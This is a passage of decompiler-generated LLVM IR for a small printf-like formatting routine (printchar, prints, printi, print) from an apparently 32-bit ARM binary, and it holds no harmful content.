dec_label_pc_84d0:                                ; preds = %dec_label_pc_84d0.preheader, %dec_label_pc_8494
  %storemerge1 = phi i32 [ %v1_84c8, %dec_label_pc_8494 ], [ %stack_var_-24.0, %dec_label_pc_84d0.preheader ]
  %v7_84dc = icmp sgt i32 %storemerge1, %stack_var_-20.0.lcssa
  %v2_84e8 = sub i32 %storemerge1, %stack_var_-24.0
  %v3_84f0 = load i8*, i8** %stack_var_-32, align 4
  %v4_84f0 = ptrtoint i8* %v3_84f0 to i32
  %v2_84f4 = add i32 %v4_84f0, %v2_84e8
  br i1 %v7_84dc, label %dec_label_pc_84e0, label %dec_label_pc_8494

dec_label_pc_84e0:                                ; preds = %dec_label_pc_84d0
  %v3_84fc = inttoptr i32 %v2_84f4 to i8*
  store i8 0, i8* %v3_84fc, align 1
  %v9_8504 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v9_8504

; uselistorder directives
  uselistorder i32 %storemerge1, { 2, 3, 0, 1 }
  uselistorder i32 %v1_8400, { 1, 0, 2 }
  uselistorder i32 %stack_var_-24.0, { 1, 0, 2, 3, 5, 4 }
  uselistorder i8** %stack_var_-32, { 3, 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 1, 5, 3, 7, 6, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_84d0, { 1, 0 }
  uselistorder label %dec_label_pc_84d0.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8460, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8508 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8508, i32* @ip, align 4
  %v0_8518 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_8524 = icmp eq i32 %v0_8518, 0
  br i1 %v2_8524, label %dec_label_pc_8558, label %dec_label_pc_852c

dec_label_pc_852c:                                ; preds = %entry
  %v1_8530 = inttoptr i32 %v0_8518 to i32*
  %v2_8530 = load i32, i32* %v1_8530, align 4
  %v1_853c = trunc i32 %arg2 to i8
  %v3_853c = inttoptr i32 %v2_8530 to i8*
  store i8 %v1_853c, i8* %v3_853c, align 1
  %v2_8544 = load i32, i32* %v1_8530, align 4
  %v1_8548 = add i32 %v2_8544, 1
  store i32 %v1_8548, i32* %v1_8530, align 4
  %v9_8570.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_856c

dec_label_pc_8558:                                ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  %v3_8568 = call i32 @__libc_write(i32 1, i32* nonnull %stack_var_-24)
  store i32 %v3_8568, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_856c

dec_label_pc_856c:                                ; preds = %dec_label_pc_852c, %dec_label_pc_8558
  %v9_8570 = phi i32 [ %v9_8570.pre, %dec_label_pc_852c ], [ %v3_8568, %dec_label_pc_8558 ]
  ret i32 %v9_8570

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_856c, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8574 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8574, i32* @ip, align 4
  %v3_8578 = load i32, i32* @fp, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %tmp43 = icmp slt i32 %arg3, 1
  br i1 %tmp43, label %dec_label_pc_8630, label %dec_label_pc_85b0

dec_label_pc_85b0:                                ; preds = %entry
  %v2_85e020 = load i8, i8* %arg2, align 1
  %v2_85e422 = icmp eq i8 %v2_85e020, 0
  br i1 %v2_85e422, label %dec_label_pc_85ec, label %dec_label_pc_85c4

dec_label_pc_85c4:                                ; preds = %dec_label_pc_85b0, %dec_label_pc_85c4
  %v4_85dc24 = phi i32 [ %v1_85d4, %dec_label_pc_85c4 ], [ %tmp, %dec_label_pc_85b0 ]
  %stack_var_-40.023 = phi i32 [ %v1_85c8, %dec_label_pc_85c4 ], [ 0, %dec_label_pc_85b0 ]
  %v1_85c8 = add i32 %stack_var_-40.023, 1
  %v1_85d4 = add i32 %v4_85dc24, 1
  %v5_85d8 = inttoptr i32 %v1_85d4 to i8*
  %v2_85e0 = load i8, i8* %v5_85d8, align 1
  %v2_85e4 = icmp eq i8 %v2_85e0, 0
  br i1 %v2_85e4, label %dec_label_pc_85ec, label %dec_label_pc_85c4

dec_label_pc_85ec:                                ; preds = %dec_label_pc_85c4, %dec_label_pc_85b0
  %stack_var_-40.0.lcssa = phi i32 [ 0, %dec_label_pc_85b0 ], [ %v1_85c8, %dec_label_pc_85c4 ]
  %v5_85f8 = icmp slt i32 %stack_var_-40.0.lcssa, %arg3
  br i1 %v5_85f8, label %dec_label_pc_8608, label %dec_label_pc_8618

dec_label_pc_8608:                                ; preds = %dec_label_pc_85ec
  %v2_8610 = sub i32 %arg3, %stack_var_-40.0.lcssa
  br label %dec_label_pc_8618

dec_label_pc_8618:                                ; preds = %dec_label_pc_85ec, %dec_label_pc_8608
  %storemerge4 = phi i32 [ %v2_8610, %dec_label_pc_8608 ], [ 0, %dec_label_pc_85ec ]
  %v1_861c = and i32 %arg4, 2
  %v2_8620 = icmp eq i32 %v1_861c, 0
  br i1 %v2_8620, label %dec_label_pc_8630, label %dec_label_pc_8628

dec_label_pc_8628:                                ; preds = %dec_label_pc_8618
  br label %dec_label_pc_8630

dec_label_pc_8630:                                ; preds = %dec_label_pc_8618, %entry, %dec_label_pc_8628
  %stack_var_-28.0 = phi i32 [ %arg3, %entry ], [ %storemerge4, %dec_label_pc_8618 ], [ %storemerge4, %dec_label_pc_8628 ]
  %stack_var_-44.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_8618 ], [ 48, %dec_label_pc_8628 ]
  %v1_8634 = urem i32 %arg4, 2
  %v2_8638 = icmp eq i32 %v1_8634, 0
  br i1 %v2_8638, label %dec_label_pc_8668.preheader, label %dec_label_pc_86a4.preheader

dec_label_pc_8668.preheader:                      ; preds = %dec_label_pc_8630
  %v5_867017 = icmp sgt i32 %stack_var_-28.0, 0
  br i1 %v5_867017, label %dec_label_pc_8644.lr.ph, label %dec_label_pc_86a4.preheader

dec_label_pc_8644.lr.ph:                          ; preds = %dec_label_pc_8668.preheader
  %v2_864c = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8644

dec_label_pc_8644:                                ; preds = %dec_label_pc_8644.lr.ph, %dec_label_pc_8644
  %stack_var_-28.118 = phi i32 [ %stack_var_-28.0, %dec_label_pc_8644.lr.ph ], [ %v1_8660, %dec_label_pc_8644 ]
  %v3_864c = call i32 @printchar(i32* %v2_864c, i32 %stack_var_-44.0)
  %v3_8650 = load i32, i32* %stack_var_-48, align 4
  %v1_8654 = add i32 %v3_8650, 1
  store i32 %v1_8654, i32* %stack_var_-48, align 4
  %v1_8660 = add nsw i32 %stack_var_-28.118, -1
  %v5_8670 = icmp sgt i32 %stack_var_-28.118, 1
  br i1 %v5_8670, label %dec_label_pc_8644, label %dec_label_pc_86a4.preheader

dec_label_pc_86a4.preheader:                      ; preds = %dec_label_pc_8644, %dec_label_pc_8668.preheader, %dec_label_pc_8630
  %v3_86e828 = phi i32 [ 0, %dec_label_pc_8630 ], [ 0, %dec_label_pc_8668.preheader ], [ %v1_8654, %dec_label_pc_8644 ]
  %stack_var_-28.2.ph = phi i32 [ %stack_var_-28.0, %dec_label_pc_8630 ], [ %stack_var_-28.0, %dec_label_pc_8668.preheader ], [ 0, %dec_label_pc_8644 ]
  %v2_86a810 = load i8, i8* %arg2, align 1
  %v2_86ac12 = icmp eq i8 %v2_86a810, 0
  br i1 %v2_86ac12, label %dec_label_pc_86dc.preheader, label %dec_label_pc_8678.lr.ph

dec_label_pc_8678.lr.ph:                          ; preds = %dec_label_pc_86a4.preheader
  %v2_8688 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8678

dec_label_pc_8678:                                ; preds = %dec_label_pc_8678.lr.ph, %dec_label_pc_8678
  %v4_86a414 = phi i32 [ %tmp, %dec_label_pc_8678.lr.ph ], [ %v1_869c, %dec_label_pc_8678 ]
  %stack_var_-24.013 = phi i8* [ %arg2, %dec_label_pc_8678.lr.ph ], [ %v5_86a0, %dec_label_pc_8678 ]
  %v2_867c = load i8, i8* %stack_var_-24.013, align 1
  %v3_867c = zext i8 %v2_867c to i32
  %v3_8688 = call i32 @printchar(i32* %v2_8688, i32 %v3_867c)
  %v3_868c = load i32, i32* %stack_var_-48, align 4
  %v1_8690 = add i32 %v3_868c, 1
  store i32 %v1_8690, i32* %stack_var_-48, align 4
  %v1_869c = add i32 %v4_86a414, 1
  %v5_86a0 = inttoptr i32 %v1_869c to i8*
  %v2_86a8 = load i8, i8* %v5_86a0, align 1
  %v2_86ac = icmp eq i8 %v2_86a8, 0
  br i1 %v2_86ac, label %dec_label_pc_86dc.preheader, label %dec_label_pc_8678

dec_label_pc_86dc.preheader:                      ; preds = %dec_label_pc_8678, %dec_label_pc_86a4.preheader
  %v3_86e827 = phi i32 [ %v3_86e828, %dec_label_pc_86a4.preheader ], [ %v1_8690, %dec_label_pc_8678 ]
  %v5_86e47 = icmp sgt i32 %stack_var_-28.2.ph, 0
  br i1 %v5_86e47, label %dec_label_pc_86b8.lr.ph, label %dec_label_pc_86e8

dec_label_pc_86b8.lr.ph:                          ; preds = %dec_label_pc_86dc.preheader
  %v2_86c0 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_86b8

dec_label_pc_86b8:                                ; preds = %dec_label_pc_86b8.lr.ph, %dec_label_pc_86b8
  %stack_var_-28.38 = phi i32 [ %stack_var_-28.2.ph, %dec_label_pc_86b8.lr.ph ], [ %v1_86d4, %dec_label_pc_86b8 ]
  %v3_86c0 = call i32 @printchar(i32* %v2_86c0, i32 %stack_var_-44.0)
  %v3_86c4 = load i32, i32* %stack_var_-48, align 4
  %v1_86c8 = add i32 %v3_86c4, 1
  store i32 %v1_86c8, i32* %stack_var_-48, align 4
  %v1_86d4 = add nsw i32 %stack_var_-28.38, -1
  %v5_86e4 = icmp sgt i32 %stack_var_-28.38, 1
  br i1 %v5_86e4, label %dec_label_pc_86b8, label %dec_label_pc_86e8

dec_label_pc_86e8:                                ; preds = %dec_label_pc_86b8, %dec_label_pc_86dc.preheader
  %v3_86e8 = phi i32 [ %v3_86e827, %dec_label_pc_86dc.preheader ], [ %v1_86c8, %dec_label_pc_86b8 ]
  store i32 %v3_8578, i32* @fp, align 4
  ret i32 %v3_86e8

; uselistorder directives
  uselistorder i32 %v1_869c, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_85d4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_86b8, { 1, 0 }
  uselistorder label %dec_label_pc_8678, { 1, 0 }
  uselistorder label %dec_label_pc_8644, { 1, 0 }
  uselistorder label %dec_label_pc_8630, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8618, { 1, 0 }
  uselistorder label %dec_label_pc_85c4, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_86fc = load i32, i32* @fp, align 4
  store i32 34564, i32* %stack_var_-4, align 4
  %v2_8700 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8700, i32* @fp, align 4
  %v1_8734 = icmp slt i32 %arg2, 0
  %v2_8734 = icmp eq i32 %arg2, 0
  br i1 %v2_8734, label %dec_label_pc_873c, label %dec_label_pc_8770

dec_label_pc_873c:                                ; preds = %entry
  store i32 48, i32* %stack_var_-28, align 4
  %v5_8760 = bitcast i32* %stack_var_-28 to i8*
  %v6_8760 = call i32 @prints(i32 %arg1, i8* %v5_8760, i32 %arg5, i32 %arg6, i32 0)
  br label %dec_label_pc_88d0

dec_label_pc_8770:                                ; preds = %entry
  %v2_8774 = icmp eq i32 %arg4, 0
  br i1 %v2_8774, label %dec_label_pc_87a8, label %dec_label_pc_877c

dec_label_pc_877c:                                ; preds = %dec_label_pc_8770
  %v7_8780 = icmp eq i32 %arg3, 10
  br i1 %v7_8780, label %dec_label_pc_8788, label %dec_label_pc_87a8

dec_label_pc_8788:                                ; preds = %dec_label_pc_877c
  br i1 %v1_8734, label %dec_label_pc_8794, label %dec_label_pc_87a8

dec_label_pc_8794:                                ; preds = %dec_label_pc_8788
  %v1_87a0 = sub i32 0, %arg2
  br label %dec_label_pc_87a8

dec_label_pc_87a8:                                ; preds = %dec_label_pc_8788, %dec_label_pc_877c, %dec_label_pc_8770, %dec_label_pc_8794
  %stack_var_-48.0 = phi i32 [ %arg2, %dec_label_pc_8770 ], [ %v1_87a0, %dec_label_pc_8794 ], [ %arg2, %dec_label_pc_8788 ], [ %arg2, %dec_label_pc_877c ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_8770 ], [ 1, %dec_label_pc_8794 ], [ 0, %dec_label_pc_8788 ], [ 0, %dec_label_pc_877c ]
  %tmp26 = bitcast i32* %stack_var_-17 to i8*
  store i8 0, i8* %tmp26, align 4
  %v2_883c4 = icmp eq i32 %stack_var_-48.0, 0
  br i1 %v2_883c4, label %dec_label_pc_8844, label %dec_label_pc_87c4.lr.ph

dec_label_pc_87c4.lr.ph:                          ; preds = %dec_label_pc_87a8
  %v2_87f0 = add i32 %arg7, -58
  br label %dec_label_pc_87c4

dec_label_pc_87c4:                                ; preds = %dec_label_pc_87c4.lr.ph, %dec_label_pc_87fc
  %stack_var_-48.16 = phi i32 [ %stack_var_-48.0, %dec_label_pc_87c4.lr.ph ], [ %v2_882c, %dec_label_pc_87fc ]
  %stack_var_-64.05 = phi i8* [ %tmp26, %dec_label_pc_87c4.lr.ph ], [ %v5_8804, %dec_label_pc_87fc ]
  %v2_87d0 = urem i32 %stack_var_-48.16, %arg3
  %v7_87e4 = icmp slt i32 %v2_87d0, 10
  br i1 %v7_87e4, label %dec_label_pc_87fc, label %dec_label_pc_87e8

dec_label_pc_87e8:                                ; preds = %dec_label_pc_87c4
  %v1_87f4 = add i32 %v2_87f0, %v2_87d0
  br label %dec_label_pc_87fc

dec_label_pc_87fc:                                ; preds = %dec_label_pc_87c4, %dec_label_pc_87e8
  %stack_var_-60.0 = phi i32 [ %v2_87d0, %dec_label_pc_87c4 ], [ %v1_87f4, %dec_label_pc_87e8 ]
  %v4_87fc = ptrtoint i8* %stack_var_-64.05 to i32
  %v1_8800 = add i32 %v4_87fc, -1
  %v5_8804 = inttoptr i32 %v1_8800 to i8*
  %fold = add i32 %stack_var_-60.0, 48
  %v1_881c = trunc i32 %fold to i8
  store i8 %v1_881c, i8* %v5_8804, align 1
  %v2_882c = udiv i32 %stack_var_-48.16, %arg3
  %v2_883c = icmp ult i32 %stack_var_-48.16, %arg3
  br i1 %v2_883c, label %dec_label_pc_8844, label %dec_label_pc_87c4

dec_label_pc_8844:                                ; preds = %dec_label_pc_87fc, %dec_label_pc_87a8
  %stack_var_-64.0.lcssa = phi i8* [ %tmp26, %dec_label_pc_87a8 ], [ %v5_8804, %dec_label_pc_87fc ]
  %v2_8848 = icmp eq i32 %stack_var_-56.0, 0
  br i1 %v2_8848, label %dec_label_pc_88ac, label %dec_label_pc_8850

dec_label_pc_8850:                                ; preds = %dec_label_pc_8844
  %v3_8850 = load i32, i32* %stack_var_0, align 4
  %v2_8854 = icmp eq i32 %v3_8850, 0
  br i1 %v2_8854, label %dec_label_pc_8894, label %dec_label_pc_885c

dec_label_pc_885c:                                ; preds = %dec_label_pc_8850
  %v1_8860 = and i32 %arg6, 2
  %v2_8864 = icmp eq i32 %v1_8860, 0
  br i1 %v2_8864, label %dec_label_pc_8894, label %dec_label_pc_886c

dec_label_pc_886c:                                ; preds = %dec_label_pc_885c
  %v2_8874 = inttoptr i32 %arg1 to i32*
  %v3_8874 = call i32 @printchar(i32* %v2_8874, i32 45)
  %v3_8884 = load i32, i32* %stack_var_0, align 4
  %v1_8888 = add i32 %v3_8884, -1
  store i32 %v1_8888, i32* %stack_var_0, align 4
  br label %dec_label_pc_88ac

dec_label_pc_8894:                                ; preds = %dec_label_pc_885c, %dec_label_pc_8850
  %v4_8894 = ptrtoint i8* %stack_var_-64.0.lcssa to i32
  %v1_8898 = add i32 %v4_8894, -1
  %v5_889c = inttoptr i32 %v1_8898 to i8*
  store i8 45, i8* %v5_889c, align 1
  br label %dec_label_pc_88ac

dec_label_pc_88ac:                                ; preds = %dec_label_pc_8844, %dec_label_pc_886c, %dec_label_pc_8894
  %stack_var_-64.1 = phi i8* [ %stack_var_-64.0.lcssa, %dec_label_pc_8844 ], [ %v5_889c, %dec_label_pc_8894 ], [ %stack_var_-64.0.lcssa, %dec_label_pc_886c ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_8844 ], [ 0, %dec_label_pc_8894 ], [ 1, %dec_label_pc_886c ]
  %v3_88b4 = load i32, i32* %stack_var_0, align 4
  %v6_88bc = call i32 @prints(i32 %arg1, i8* %stack_var_-64.1, i32 %v3_88b4, i32 %arg6, i32 ptrtoint (i32* @0 to i32))
  %v2_88c8 = add i32 %v6_88bc, %stack_var_-52.0
  br label %dec_label_pc_88d0

dec_label_pc_88d0:                                ; preds = %dec_label_pc_873c, %dec_label_pc_88ac
  %storemerge2 = phi i32 [ %v2_88c8, %dec_label_pc_88ac ], [ %v6_8760, %dec_label_pc_873c ]
  store i32 %v3_86fc, i32* @fp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %stack_var_-64.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_8804, { 0, 2, 1 }
  uselistorder i32 %v2_87d0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-48.16, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_88d0, { 1, 0 }
  uselistorder label %dec_label_pc_88ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_87fc, { 1, 0 }
  uselistorder label %dec_label_pc_87c4, { 1, 0 }
  uselistorder label %dec_label_pc_87a8, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-18 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_88e0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_88e0, i32* @ip, align 4
  store i32 35052, i32* %stack_var_-4, align 4
  %v2_88e8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_88e8, i32* @fp, align 4
  %stack_var_-28.428 = inttoptr i32 %arg2 to i8*
  %v2_8c9429 = load i8, i8* %stack_var_-28.428, align 1
  %v2_8c9831 = icmp eq i8 %v2_8c9429, 0
  br i1 %v2_8c9831, label %dec_label_pc_8ca0, label %dec_label_pc_8908.lr.ph

dec_label_pc_8908.lr.ph:                          ; preds = %entry
  %v5_8c4c = bitcast i32* %stack_var_-18 to i8*
  br label %dec_label_pc_8908

dec_label_pc_8908:                                ; preds = %dec_label_pc_8908.lr.ph, %dec_label_pc_8c84
  %stack_var_-28.435 = phi i8* [ %stack_var_-28.428, %dec_label_pc_8908.lr.ph ], [ %stack_var_-28.4, %dec_label_pc_8c84 ]
  %stack_var_-28.4.in34 = phi i32 [ %arg2, %dec_label_pc_8908.lr.ph ], [ %v1_8c88, %dec_label_pc_8c84 ]
  %stack_var_-32.133 = phi i32 [ %arg3, %dec_label_pc_8908.lr.ph ], [ %stack_var_-32.0, %dec_label_pc_8c84 ]
  %stack_var_-40.132 = phi i32 [ 0, %dec_label_pc_8908.lr.ph ], [ %stack_var_-40.0, %dec_label_pc_8c84 ]
  %v2_890c = load i8, i8* %stack_var_-28.435, align 1
  %v7_8910 = icmp eq i8 %v2_890c, 37
  br i1 %v7_8910, label %dec_label_pc_8918, label %dec_label_pc_8c64

dec_label_pc_8918:                                ; preds = %dec_label_pc_8908
  %v1_891c = add i32 %stack_var_-28.4.in34, 1
  %v5_8920 = inttoptr i32 %v1_891c to i8*
  %v2_8938 = load i8, i8* %v5_8920, align 1
  %v2_893c = icmp eq i8 %v2_8938, 0
  br i1 %v2_893c, label %dec_label_pc_8ca0, label %dec_label_pc_8944

dec_label_pc_8944:                                ; preds = %dec_label_pc_8918
  %v2_8948 = load i8, i8* %v5_8920, align 1
  %v7_894c = icmp eq i8 %v2_8948, 37
  br i1 %v7_894c, label %dec_label_pc_8c64, label %dec_label_pc_8954

dec_label_pc_8954:                                ; preds = %dec_label_pc_8944
  %v2_8958 = load i8, i8* %v5_8920, align 1
  %v7_895c = icmp eq i8 %v2_8958, 45
  br i1 %v7_895c, label %dec_label_pc_8964, label %dec_label_pc_8994.preheader

dec_label_pc_8964:                                ; preds = %dec_label_pc_8954
  %v1_8968 = add i32 %stack_var_-28.4.in34, 2
  %v5_896c = inttoptr i32 %v1_8968 to i8*
  br label %dec_label_pc_8994.preheader

dec_label_pc_8994.preheader:                      ; preds = %dec_label_pc_8964, %dec_label_pc_8954
  %stack_var_-28.0.ph = phi i8* [ %v5_8920, %dec_label_pc_8954 ], [ %v5_896c, %dec_label_pc_8964 ]
  %stack_var_-44.0.ph = phi i32 [ 0, %dec_label_pc_8954 ], [ 1, %dec_label_pc_8964 ]
  %v4_89942 = ptrtoint i8* %stack_var_-28.0.ph to i32
  %v2_89983 = load i8, i8* %stack_var_-28.0.ph, align 1
  %v7_899c7 = icmp eq i8 %v2_89983, 48
  br i1 %v7_899c7, label %dec_label_pc_897c, label %dec_label_pc_89e0.preheader

dec_label_pc_897c:                                ; preds = %dec_label_pc_8994.preheader, %dec_label_pc_897c
  %v4_89949 = phi i32 [ %v1_8980, %dec_label_pc_897c ], [ %v4_89942, %dec_label_pc_8994.preheader ]
  %stack_var_-44.08 = phi i32 [ %v1_898c, %dec_label_pc_897c ], [ %stack_var_-44.0.ph, %dec_label_pc_8994.preheader ]
  %v1_8980 = add i32 %v4_89949, 1
  %v5_8984 = inttoptr i32 %v1_8980 to i8*
  %v1_898c = or i32 %stack_var_-44.08, 2
  %v2_8998 = load i8, i8* %v5_8984, align 1
  %v7_899c = icmp eq i8 %v2_8998, 48
  br i1 %v7_899c, label %dec_label_pc_897c, label %dec_label_pc_89e0.preheader

dec_label_pc_89e0.preheader:                      ; preds = %dec_label_pc_897c, %dec_label_pc_8994.preheader
  %stack_var_-44.0.lcssa = phi i32 [ %stack_var_-44.0.ph, %dec_label_pc_8994.preheader ], [ %v1_898c, %dec_label_pc_897c ]
  %stack_var_-28.0.lcssa = phi i8* [ %stack_var_-28.0.ph, %dec_label_pc_8994.preheader ], [ %v5_8984, %dec_label_pc_897c ]
  %v4_89e011 = ptrtoint i8* %stack_var_-28.0.lcssa to i32
  %v2_89e412 = load i8, i8* %stack_var_-28.0.lcssa, align 1
  %tmp60 = icmp ult i8 %v2_89e412, 48
  br i1 %tmp60, label %dec_label_pc_8a00, label %dec_label_pc_89f0

dec_label_pc_89a8:                                ; preds = %dec_label_pc_89f0
  %v2_89b4 = mul i32 %stack_var_-48.019, 10
  %v2_89c0 = load i8, i8* %stack_var_-28.120, align 1
  %v3_89c0 = zext i8 %v2_89c0 to i32
  %v2_89c8 = add i32 %v2_89b4, -48
  %v1_89cc = add i32 %v2_89c8, %v3_89c0
  %v1_89d8 = add i32 %v4_89e021, 1
  %v5_89dc = inttoptr i32 %v1_89d8 to i8*
  %v2_89e4 = load i8, i8* %v5_89dc, align 1
  %tmp61 = icmp ult i8 %v2_89e4, 48
  br i1 %tmp61, label %dec_label_pc_8a00, label %dec_label_pc_89f0

dec_label_pc_89f0:                                ; preds = %dec_label_pc_89e0.preheader, %dec_label_pc_89a8
  %v4_89e021 = phi i32 [ %v1_89d8, %dec_label_pc_89a8 ], [ %v4_89e011, %dec_label_pc_89e0.preheader ]
  %stack_var_-28.120 = phi i8* [ %v5_89dc, %dec_label_pc_89a8 ], [ %stack_var_-28.0.lcssa, %dec_label_pc_89e0.preheader ]
  %stack_var_-48.019 = phi i32 [ %v1_89cc, %dec_label_pc_89a8 ], [ 0, %dec_label_pc_89e0.preheader ]
  %v2_89f4 = load i8, i8* %stack_var_-28.120, align 1
  %tmp62 = icmp ult i8 %v2_89f4, 58
  br i1 %tmp62, label %dec_label_pc_89a8, label %dec_label_pc_8a00

dec_label_pc_8a00:                                ; preds = %dec_label_pc_89a8, %dec_label_pc_89f0, %dec_label_pc_89e0.preheader
  %stack_var_-48.0.lcssa = phi i32 [ 0, %dec_label_pc_89e0.preheader ], [ %v1_89cc, %dec_label_pc_89a8 ], [ %stack_var_-48.019, %dec_label_pc_89f0 ]
  %stack_var_-28.1.lcssa = phi i8* [ %stack_var_-28.0.lcssa, %dec_label_pc_89e0.preheader ], [ %v5_89dc, %dec_label_pc_89a8 ], [ %stack_var_-28.120, %dec_label_pc_89f0 ]
  %v2_8a04 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8a08 = icmp eq i8 %v2_8a04, 115
  br i1 %v7_8a08, label %dec_label_pc_8a10, label %dec_label_pc_8a74

dec_label_pc_8a10:                                ; preds = %dec_label_pc_8a00
  %v1_8a14 = add i32 %stack_var_-32.133, 4
  %v1_8a20 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8a20 = load i32, i32* %v1_8a20, align 4
  %v2_8a2c = icmp eq i32 %v2_8a20, 0
  br i1 %v2_8a2c, label %dec_label_pc_8a40, label %dec_label_pc_8a34

dec_label_pc_8a34:                                ; preds = %dec_label_pc_8a10
  %v5_8a38 = inttoptr i32 %v2_8a20 to i8*
  br label %dec_label_pc_8a48

dec_label_pc_8a40:                                ; preds = %dec_label_pc_8a10
  br label %dec_label_pc_8a48

dec_label_pc_8a48:                                ; preds = %dec_label_pc_8a34, %dec_label_pc_8a40
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1a2d8.35, i32 0, i32 0), %dec_label_pc_8a40 ], [ %v5_8a38, %dec_label_pc_8a34 ]
  %v7_8a5c = call i32 @prints(i32 %tmp, i8* %storemerge, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 ptrtoint (i32* @0 to i32))
  %v2_8a68 = add i32 %v7_8a5c, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8a74:                                ; preds = %dec_label_pc_8a00
  %v2_8a78 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8a7c = icmp eq i8 %v2_8a78, 100
  br i1 %v7_8a7c, label %dec_label_pc_8a84, label %dec_label_pc_8ad8

dec_label_pc_8a84:                                ; preds = %dec_label_pc_8a74
  %v1_8a88 = add i32 %stack_var_-32.133, 4
  %v1_8a94 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8a94 = load i32, i32* %v1_8a94, align 4
  %v7_8ac0 = call i32 @printi(i32 %tmp, i32 %v2_8a94, i32 10, i32 1, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8acc = add i32 %v7_8ac0, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8ad8:                                ; preds = %dec_label_pc_8a74
  %v2_8adc = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8ae0 = icmp eq i8 %v2_8adc, 120
  br i1 %v7_8ae0, label %dec_label_pc_8ae8, label %dec_label_pc_8b3c

dec_label_pc_8ae8:                                ; preds = %dec_label_pc_8ad8
  %v1_8aec = add i32 %stack_var_-32.133, 4
  %v1_8af8 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8af8 = load i32, i32* %v1_8af8, align 4
  %v7_8b24 = call i32 @printi(i32 %tmp, i32 %v2_8af8, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8b30 = add i32 %v7_8b24, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8b3c:                                ; preds = %dec_label_pc_8ad8
  %v2_8b40 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8b44 = icmp eq i8 %v2_8b40, 88
  br i1 %v7_8b44, label %dec_label_pc_8b4c, label %dec_label_pc_8ba0

dec_label_pc_8b4c:                                ; preds = %dec_label_pc_8b3c
  %v1_8b50 = add i32 %stack_var_-32.133, 4
  %v1_8b5c = inttoptr i32 %stack_var_-32.133 to i32*
